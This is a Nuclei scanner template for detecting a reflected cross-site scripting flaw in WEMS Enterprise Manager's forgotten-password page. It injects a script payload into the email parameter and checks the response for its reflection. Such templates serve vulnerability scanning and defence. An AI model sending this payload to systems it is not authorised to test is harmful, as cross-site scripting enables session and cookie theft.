# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: WEMS-XSS

info:
  name: WEMS Enterprise Manager XSS
  author: pikpikcu
  severity: medium

http:
  - method: GET
    path:
      - '{{BaseURL}}/guest/users/forgotten?email="><script>confirm(document.cookie)</script>'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"><script>confirm(document.cookie)</script>'
        part: body
